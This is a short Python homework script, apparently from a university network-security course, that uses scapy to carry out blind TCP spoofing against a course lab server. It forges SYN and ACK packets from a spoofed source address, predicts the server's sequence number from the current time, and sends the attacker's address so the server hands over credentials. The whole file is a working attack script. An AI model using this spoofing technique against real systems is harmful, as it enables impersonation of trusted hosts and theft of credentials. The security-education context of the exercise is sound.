'''
NAME: Neha Rajendra Vadnere
ASU ID: 1217377161
DATE: 13/11/2019
INFO: OBTAIN CREDENTIALS FROM SERVER : TCP SPOOFING
HOMEWORK3:PROBLEM0
'''

from scapy.all import *
import time

while (1):
    #Spoofed syn packet:
    IP_pkt_spoofed = IP(src="10.2.4.10",dst="obtaincreds.cse545.rev.fish")
    TCP_pkt_syn = TCP(sport=1234,dport=13337,flags="S")
    data = "10.0.1.20"
    
    #send SYN request to server:
    send(IP_pkt_spoofed/TCP_pkt_syn)
    
    #print syn and ack:
    #seq1 = res.seq
    #print seq1
    ack1 = int(time.time()) + 1

    #send ACK to server:
    ACK_pkt = TCP(sport=1234, dport=13337, flags='A', seq=1, ack=ack1)
    
    # ACK Send && response
    send(IP_pkt_spoofed/ACK_pkt/raw(data))
